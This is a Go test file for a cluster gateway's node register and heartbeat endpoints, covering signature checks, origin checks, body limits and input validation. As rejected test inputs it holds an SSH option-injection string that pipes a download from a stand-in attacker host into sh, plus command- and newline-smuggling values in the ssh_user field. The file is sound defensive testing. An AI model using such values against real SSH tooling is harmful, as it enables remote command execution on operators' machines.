package nodeapi

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/DeBrosOfficial/network/pkg/auth"
	"github.com/DeBrosOfficial/network/pkg/nodeapi"
	"github.com/DeBrosOfficial/network/pkg/rqlite"
	"go.uber.org/zap"
)

const (
	testSecret = "cluster-secret-for-tests"
	// A real libp2p peer id: the handler refuses anything else, because this is
	// what every consumer reads back out of the row.
	testNodeID  = "12D3KooWEyoppNCUx8Yx66oV9fJnriXwCcXwDDUA2kj6vnc6iDEg"
	otherNodeID = "12D3KooWGRUmVFxUCUxGGRUpZ2SnEPnbPtGSHRpFyGRNVBEEcgHY"

	// A process on this host, which is what the node client is.
	loopbackCaller = "127.0.0.1:54321"
)

// execCall is one write the handler asked for.
type execCall struct {
	query string
	args  []any
}

// recordingDB is an rqlite.Client that records writes. Only Exec is
// implemented; a handler reaching for anything else is a change this test
// should notice, not one it should silently allow.
type recordingDB struct {
	rqlite.Client
	mu       sync.Mutex
	calls    []execCall
	result   sql.Result
	execErr  error
	affected int64
	// wgIP is the overlay address the cluster allocated to this node, or ""
	// when it has no peer row yet.
	wgIP     string
	queryErr error
}

// Query answers the overlay-allocation lookup. An empty allocation is "this
// node has no peer row yet", which the handler treats as nothing to check
// against; a test that wants the contradiction sets wgIP.
func (d *recordingDB) Query(_ context.Context, dest any, _ string, _ ...any) error {
	rows, ok := dest.(*[]struct {
		WGIP string `db:"wg_ip"`
	})
	if !ok {
		return errUnreadable
	}
	if d.queryErr != nil {
		return d.queryErr
	}
	if d.wgIP != "" {
		*rows = append(*rows, struct {
			WGIP string `db:"wg_ip"`
		}{WGIP: d.wgIP})
	}
	return nil
}

func (d *recordingDB) Exec(_ context.Context, query string, args ...any) (sql.Result, error) {
	d.mu.Lock()
	d.calls = append(d.calls, execCall{query: query, args: args})
	d.mu.Unlock()
	if d.execErr != nil {
		return nil, d.execErr
	}
	if d.result != nil {
		return d.result, nil
	}
	return affectedRows(d.affected), nil
}

type affectedRows int64

func (a affectedRows) LastInsertId() (int64, error) { return 0, nil }
func (a affectedRows) RowsAffected() (int64, error) { return int64(a), nil }

// unreadableResult is a driver answer that cannot say how many rows it touched.
type unreadableResult struct{}

func (unreadableResult) LastInsertId() (int64, error) { return 0, nil }
func (unreadableResult) RowsAffected() (int64, error) { return 0, errUnreadable }

var errUnreadable = &countError{}

type countError struct{}

func (*countError) Error() string { return "this driver cannot count rows" }

func newHandler(db *recordingDB) *Handler {
	return NewHandler(zap.NewNop(), db, auth.SharedClusterKey(testSecret))
}

// post builds a stamped request the way the node client does.
func post(t *testing.T, path, nodeID string, payload any) *http.Request {
	t.Helper()
	body, err := json.Marshal(payload)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	r := httptest.NewRequest(http.MethodPost, path, bytes.NewReader(body))
	r.RemoteAddr = loopbackCaller
	key, err := auth.ClusterNodeAPIKey(testSecret)
	if err != nil {
		t.Fatalf("key: %v", err)
	}
	if err := auth.SignNodeAPI(key, r, nodeID, body, time.Now()); err != nil {
		t.Fatalf("sign: %v", err)
	}
	return r
}

func validRegistration() nodeapi.RegisterRequest {
	return nodeapi.RegisterRequest{
		IPAddress:      "203.0.113.7",
		InternalIP:     "10.0.0.7",
		Region:         "local",
		SSHUser:        "orama",
		Environment:    "devnet",
		OperatorWallet: "0xabc",
	}
}

// A node registers itself, and the row is keyed on the node that stamped the
// request.
func TestRegister_recordsTheNodeThatStampedTheRequest(t *testing.T) {
	db := &recordingDB{affected: 1}
	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, validRegistration()))

	if w.Code != http.StatusNoContent {
		t.Fatalf("status = %d, body %q", w.Code, w.Body.String())
	}
	if len(db.calls) != 1 {
		t.Fatalf("wrote %d times, want 1", len(db.calls))
	}
	call := db.calls[0]
	if !strings.Contains(call.query, "INSERT INTO dns_nodes") {
		t.Errorf("wrote something other than a dns_nodes row: %q", call.query)
	}
	if got := call.args[0]; got != testNodeID {
		t.Errorf("row keyed on %v, want the stamped node %q", got, testNodeID)
	}
	if got := call.args[1]; got != "203.0.113.7" {
		t.Errorf("ip_address = %v, want the one in the body", got)
	}
}

// The body cannot name a node. Which node a registration is about comes from
// the stamp, so a node that captured another's request body still registers
// only itself — this is the property the direct INSERT could not have.
func TestRegister_theBodyCannotNameADifferentNode(t *testing.T) {
	db := &recordingDB{affected: 1}
	w := httptest.NewRecorder()

	// A body carrying every field the handler reads, plus a node_id it does
	// not: the field is not in RegisterRequest at all, so it is ignored, and
	// this test fails the day somebody adds one.
	raw := map[string]any{
		"node_id":     otherNodeID,
		"id":          otherNodeID,
		"ip_address":  "203.0.113.7",
		"internal_ip": "10.0.0.7",
		"region":      "local",
	}
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, raw))

	if w.Code != http.StatusNoContent {
		t.Fatalf("status = %d, body %q", w.Code, w.Body.String())
	}
	if got := db.calls[0].args[0]; got != testNodeID {
		t.Errorf("row keyed on %v — the body named the node instead of the stamp", got)
	}
}

// An unstamped request is refused, and nothing is written.
func TestRegister_anUnstampedRequestWritesNothing(t *testing.T) {
	db := &recordingDB{affected: 1}
	body, _ := json.Marshal(validRegistration())
	r := httptest.NewRequest(http.MethodPost, "/v1/internal/node/register", bytes.NewReader(body))
	r.RemoteAddr = loopbackCaller

	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, r)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("status = %d, want 401", w.Code)
	}
	if len(db.calls) != 0 {
		t.Errorf("an unauthenticated caller wrote %d rows", len(db.calls))
	}
}

// A stamp from another cluster is refused. Same shape, different secret.
func TestRegister_aStampFromAnotherClusterWritesNothing(t *testing.T) {
	db := &recordingDB{affected: 1}
	h := NewHandler(zap.NewNop(), db, auth.SharedClusterKey("a-different-cluster"))

	w := httptest.NewRecorder()
	h.HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, validRegistration()))

	if w.Code != http.StatusUnauthorized {
		t.Errorf("status = %d, want 401", w.Code)
	}
	if len(db.calls) != 0 {
		t.Errorf("a stamp from another cluster wrote %d rows", len(db.calls))
	}
}

// A gateway with no cluster secret refuses these calls rather than serving them
// unauthenticated. The WireGuard peer endpoint shipped the other way for a
// year: `if secret != "" && mismatch` let everything through on a gateway
// configured without one.
func TestRegister_aGatewayWithNoSecretRefusesRatherThanOpens(t *testing.T) {
	db := &recordingDB{affected: 1}
	h := NewHandler(zap.NewNop(), db, nil)

	w := httptest.NewRecorder()
	h.HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, validRegistration()))

	if w.Code != http.StatusServiceUnavailable {
		t.Errorf("status = %d, want 503", w.Code)
	}
	if len(db.calls) != 0 {
		t.Errorf("a gateway with no secret wrote %d rows", len(db.calls))
	}
}

// The id becomes the row's primary key and is read back as a peer id by every
// consumer, so a malformed one is refused rather than stored.
func TestRegister_aNodeIdThatIsNotAPeerIdIsRefused(t *testing.T) {
	db := &recordingDB{affected: 1}
	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", "not-a-peer-id", validRegistration()))

	if w.Code != http.StatusBadRequest {
		t.Errorf("status = %d, want 400", w.Code)
	}
	if len(db.calls) != 0 {
		t.Errorf("a malformed node id wrote %d rows", len(db.calls))
	}
}

// A claim that could not have come from a node is refused before it reaches a
// column that DNS answers and operator output are rendered from.
func TestRegister_refusesAClaimThatCouldNotBeANodes(t *testing.T) {
	cases := map[string]func(*nodeapi.RegisterRequest){
		"no ip address":                 func(r *nodeapi.RegisterRequest) { r.IPAddress = "" },
		"an ip address that is not one": func(r *nodeapi.RegisterRequest) { r.IPAddress = "not-an-ip" },
		"no internal ip":                func(r *nodeapi.RegisterRequest) { r.InternalIP = "" },
		"no region":                     func(r *nodeapi.RegisterRequest) { r.Region = "  " },
		"a newline in the ssh user": func(r *nodeapi.RegisterRequest) {
			r.SSHUser = "orama\nPermitRootLogin yes"
		},
		"a null byte in the environment": func(r *nodeapi.RegisterRequest) { r.Environment = "devnet\x00" },
		"an overlong operator wallet": func(r *nodeapi.RegisterRequest) {
			r.OperatorWallet = strings.Repeat("a", maxFieldLength+1)
		},
	}

	for name, corrupt := range cases {
		t.Run(name, func(t *testing.T) {
			db := &recordingDB{affected: 1}
			req := validRegistration()
			corrupt(&req)

			w := httptest.NewRecorder()
			newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, req))

			if w.Code != http.StatusBadRequest {
				t.Errorf("status = %d, want 400", w.Code)
			}
			if len(db.calls) != 0 {
				t.Errorf("%s wrote %d rows", name, len(db.calls))
			}
		})
	}
}

// A body that is not JSON at all is the caller's mistake, not a server error.
func TestRegister_refusesABodyThatIsNotJSON(t *testing.T) {
	db := &recordingDB{affected: 1}
	body := []byte("this is not json")
	r := httptest.NewRequest(http.MethodPost, "/v1/internal/node/register", bytes.NewReader(body))
	r.RemoteAddr = loopbackCaller
	key, _ := auth.ClusterNodeAPIKey(testSecret)
	if err := auth.SignNodeAPI(key, r, testNodeID, body, time.Now()); err != nil {
		t.Fatalf("sign: %v", err)
	}

	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, r)

	if w.Code != http.StatusBadRequest {
		t.Errorf("status = %d, want 400", w.Code)
	}
}

// A write that fails is reported as a failure. It used to be a warning line in
// a log nobody reads, and the node carried on as though it had registered.
func TestRegister_aFailedWriteIsReported(t *testing.T) {
	db := &recordingDB{execErr: errUnreadable}
	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, validRegistration()))

	if w.Code != http.StatusInternalServerError {
		t.Errorf("status = %d, want 500", w.Code)
	}
	if strings.Contains(w.Body.String(), errUnreadable.Error()) {
		t.Error("the refusal repeated the database's own error back to the caller")
	}
}

// A heartbeat that matched a row says so, and the node carries on.
func TestHeartbeat_aMatchedRowIsRegistered(t *testing.T) {
	db := &recordingDB{affected: 1}
	w := httptest.NewRecorder()
	newHandler(db).HandleHeartbeat(w, post(t, "/v1/internal/node/heartbeat", testNodeID, struct{}{}))

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, body %q", w.Code, w.Body.String())
	}
	var resp nodeapi.HeartbeatResponse
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if !resp.Registered {
		t.Error("a heartbeat that updated a row reported the node as unregistered")
	}
	if got := db.calls[0].args[0]; got != testNodeID {
		t.Errorf("heartbeat updated %v, want the stamped node", got)
	}
	if !strings.Contains(db.calls[0].query, "status = 'active'") {
		t.Error("a heartbeat did not re-assert 'active', so a node reaped during a restart stays inactive")
	}
}

// A heartbeat that matched nothing is a node whose registration never landed.
// It is told so, and registers — rather than heartbeating into nothing forever.
func TestHeartbeat_anUnmatchedRowIsNotRegistered(t *testing.T) {
	db := &recordingDB{affected: 0}
	w := httptest.NewRecorder()
	newHandler(db).HandleHeartbeat(w, post(t, "/v1/internal/node/heartbeat", testNodeID, struct{}{}))

	var resp nodeapi.HeartbeatResponse
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if resp.Registered {
		t.Error("a heartbeat that updated nothing reported the node as registered")
	}
}

// A driver that cannot report the count is not evidence the row exists.
// Answering "registered" on no evidence would leave a node that never
// registered heartbeating into nothing forever.
func TestHeartbeat_anUncountableAnswerIsNotEvidenceOfARow(t *testing.T) {
	db := &recordingDB{result: unreadableResult{}}
	w := httptest.NewRecorder()
	newHandler(db).HandleHeartbeat(w, post(t, "/v1/internal/node/heartbeat", testNodeID, struct{}{}))

	var resp nodeapi.HeartbeatResponse
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("decode: %v", err)
	}
	if resp.Registered {
		t.Error("a driver that could not count rows was read as evidence the row exists")
	}
}

// An unstamped heartbeat is refused, and touches nothing.
func TestHeartbeat_anUnstampedRequestWritesNothing(t *testing.T) {
	db := &recordingDB{affected: 1}
	r := httptest.NewRequest(http.MethodPost, "/v1/internal/node/heartbeat", strings.NewReader("{}"))
	r.RemoteAddr = loopbackCaller

	w := httptest.NewRecorder()
	newHandler(db).HandleHeartbeat(w, r)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("status = %d, want 401", w.Code)
	}
	if len(db.calls) != 0 {
		t.Errorf("an unauthenticated caller wrote %d rows", len(db.calls))
	}
}

// These endpoints write, so they answer only to POST.
func TestNodeAPI_onlyPostIsServed(t *testing.T) {
	db := &recordingDB{affected: 1}
	h := newHandler(db)

	for _, method := range []string{http.MethodGet, http.MethodPut, http.MethodDelete} {
		w := httptest.NewRecorder()
		h.HandleRegister(w, httptest.NewRequest(method, "/v1/internal/node/register", nil))
		if w.Code != http.StatusMethodNotAllowed {
			t.Errorf("%s register: status = %d, want 405", method, w.Code)
		}
		w = httptest.NewRecorder()
		h.HandleHeartbeat(w, httptest.NewRequest(method, "/v1/internal/node/heartbeat", nil))
		if w.Code != http.StatusMethodNotAllowed {
			t.Errorf("%s heartbeat: status = %d, want 405", method, w.Code)
		}
	}
	if len(db.calls) != 0 {
		t.Errorf("a method that is not POST wrote %d rows", len(db.calls))
	}
}

// The body is read before the stamp is checked, because the stamp covers it.
// That read is bounded, so a caller cannot make the gateway buffer whatever it
// likes on an endpoint it reaches before being authenticated.
//
// The body here is a valid, correctly stamped registration padded past the cap
// with a field the handler does not read — so nothing but the bound refuses it.
func TestNodeAPI_theBodyIsBounded(t *testing.T) {
	db := &recordingDB{affected: 1}

	padded := map[string]any{
		"ip_address":  "203.0.113.7",
		"internal_ip": "10.0.0.7",
		"region":      "local",
		"padding":     strings.Repeat("a", maxBodyBytes),
	}
	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, padded))

	if w.Code != http.StatusBadRequest {
		t.Errorf("status = %d, want 400 — an oversized body was read in full", w.Code)
	}
	if len(db.calls) != 0 {
		t.Errorf("an oversized body wrote %d rows", len(db.calls))
	}

	// And the same body under the cap is accepted, so the refusal above is the
	// bound and not the padding field.
	db = &recordingDB{affected: 1}
	padded["padding"] = strings.Repeat("a", 1024)
	w = httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, padded))

	if w.Code != http.StatusNoContent {
		t.Fatalf("a body under the cap was refused: %d %q", w.Code, w.Body.String())
	}
}

// Caddy proxies every path on this node's domains to the gateway, so a request
// from the internet arrives on loopback carrying the address Caddy is talking
// to. Loopback on its own is therefore not evidence of a local caller, and an
// endpoint that treated it as such would be open to the world.
func TestNodeAPI_aRequestFromTheInternetIsNotServed(t *testing.T) {
	db := &recordingDB{affected: 1}
	h := newHandler(db)

	// The shape a public request has after Caddy: loopback source, and the
	// client's own address appended to X-Forwarded-For.
	r := post(t, "/v1/internal/node/register", testNodeID, validRegistration())
	r.Header.Set("X-Forwarded-For", "198.51.100.9")

	w := httptest.NewRecorder()
	h.HandleRegister(w, r)

	if w.Code != http.StatusNotFound {
		t.Errorf("status = %d, want 404 — this endpoint answered the internet", w.Code)
	}
	if len(db.calls) != 0 {
		t.Errorf("a caller from the internet wrote %d rows", len(db.calls))
	}

	// A caller that reached the gateway directly from off the node is refused
	// too, forwarding header or not.
	r = post(t, "/v1/internal/node/heartbeat", testNodeID, struct{}{})
	r.RemoteAddr = "198.51.100.9:44444"
	w = httptest.NewRecorder()
	h.HandleHeartbeat(w, r)
	if w.Code != http.StatusNotFound {
		t.Errorf("status = %d, want 404 — a direct off-node caller was served", w.Code)
	}
}

// Another node on the overlay is a legitimate caller: the mesh is not reachable
// from outside it.
func TestNodeAPI_aCallerOnTheOverlayIsServed(t *testing.T) {
	db := &recordingDB{affected: 1}
	r := post(t, "/v1/internal/node/register", testNodeID, validRegistration())
	r.RemoteAddr = "10.0.0.4:40000"

	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, r)

	if w.Code != http.StatusNoContent {
		t.Fatalf("status = %d, body %q", w.Code, w.Body.String())
	}
}

// `ssh_user` is read back by the operator CLI and concatenated into
// "<user>@<host>" as one argv entry for ssh(1). A value starting with "-" is
// parsed as an option, and -oProxyCommand= runs a command — on the operator's
// machine, which holds the RootWallet and the fleet's keys.
func TestRegister_refusesAnSSHUserThatSSHWouldReadAsAnOption(t *testing.T) {
	for _, sshUser := range []string{
		"-oProxyCommand=curl http://attacker/x|sh",
		"--",
		"root -oProxyCommand=id",
		"orama;id",
		"Orama",
		strings.Repeat("a", 33),
	} {
		t.Run(sshUser, func(t *testing.T) {
			db := &recordingDB{affected: 1}
			req := validRegistration()
			req.SSHUser = sshUser

			w := httptest.NewRecorder()
			newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, req))

			if w.Code != http.StatusBadRequest {
				t.Errorf("status = %d, want 400", w.Code)
			}
			if len(db.calls) != 0 {
				t.Errorf("wrote %d rows", len(db.calls))
			}
		})
	}

	// And an ordinary login name is still accepted, so the rule refuses the
	// dangerous shape rather than the field.
	db := &recordingDB{affected: 1}
	req := validRegistration()
	req.SSHUser = "orama_node-1"
	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, req))
	if w.Code != http.StatusNoContent {
		t.Errorf("an ordinary login name was refused: %d %q", w.Code, w.Body.String())
	}
}

// A row saying `active` is handed to every consumer that routes traffic, so an
// address nothing else can reach is not a registration.
func TestRegister_refusesAnAddressNobodyCanReach(t *testing.T) {
	cases := map[string]func(*nodeapi.RegisterRequest){
		"loopback public ip":     func(r *nodeapi.RegisterRequest) { r.IPAddress = "127.0.0.1" },
		"unspecified public ip":  func(r *nodeapi.RegisterRequest) { r.IPAddress = "0.0.0.0" },
		"loopback v6 public ip":  func(r *nodeapi.RegisterRequest) { r.IPAddress = "::1" },
		"loopback overlay ip":    func(r *nodeapi.RegisterRequest) { r.InternalIP = "127.0.0.1" },
		"unspecified overlay ip": func(r *nodeapi.RegisterRequest) { r.InternalIP = "::" },
	}
	for name, corrupt := range cases {
		t.Run(name, func(t *testing.T) {
			db := &recordingDB{affected: 1}
			req := validRegistration()
			corrupt(&req)

			w := httptest.NewRecorder()
			newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, req))

			if w.Code != http.StatusBadRequest {
				t.Errorf("status = %d, want 400", w.Code)
			}
			if len(db.calls) != 0 {
				t.Errorf("%s wrote %d rows", name, len(db.calls))
			}
		})
	}
}

// The overlay address is what every other node dials this one on — raft joins,
// namespace cluster membership, eviction. It is allocated by the cluster, so a
// node claiming a different one is claiming something it does not decide, and
// the effect would be to point inter-node traffic wherever it likes.
func TestRegister_refusesAnOverlayAddressTheClusterDidNotAllocate(t *testing.T) {
	db := &recordingDB{affected: 1, wgIP: "10.0.0.7"}
	req := validRegistration()
	req.InternalIP = "10.0.0.99"

	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, req))

	if w.Code != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", w.Code)
	}
	if !strings.Contains(w.Body.String(), "10.0.0.7") {
		t.Errorf("the refusal does not say what was allocated: %q", w.Body.String())
	}
	if len(db.calls) != 0 {
		t.Errorf("a forged overlay address wrote %d rows", len(db.calls))
	}
}

// The allocated address is accepted, so the check above refuses the
// contradiction and not the field.
func TestRegister_acceptsTheOverlayAddressTheClusterAllocated(t *testing.T) {
	db := &recordingDB{affected: 1, wgIP: "10.0.0.7"}
	req := validRegistration()
	req.InternalIP = "10.0.0.7"

	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, req))

	if w.Code != http.StatusNoContent {
		t.Fatalf("status = %d, body %q", w.Code, w.Body.String())
	}
}

// A node with no peer row yet is registering before its mesh row landed. There
// is nothing to check the claim against, and that is not the same as accepting
// a contradiction.
func TestRegister_withNoAllocationYetHasNothingToContradict(t *testing.T) {
	db := &recordingDB{affected: 1} // no wgIP
	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, validRegistration()))

	if w.Code != http.StatusNoContent {
		t.Fatalf("status = %d, body %q", w.Code, w.Body.String())
	}
}

// A lookup that fails is not an allocation that agrees. Reading it as one would
// make the check skippable by whatever can break the query.
func TestRegister_anUnreadableAllocationIsNotAgreement(t *testing.T) {
	db := &recordingDB{affected: 1, queryErr: errUnreadable}
	w := httptest.NewRecorder()
	newHandler(db).HandleRegister(w, post(t, "/v1/internal/node/register", testNodeID, validRegistration()))

	if w.Code == http.StatusNoContent {
		t.Error("a node registered while its overlay allocation could not be read")
	}
	if len(db.calls) != 0 {
		t.Errorf("wrote %d rows despite an unreadable allocation", len(db.calls))
	}
}
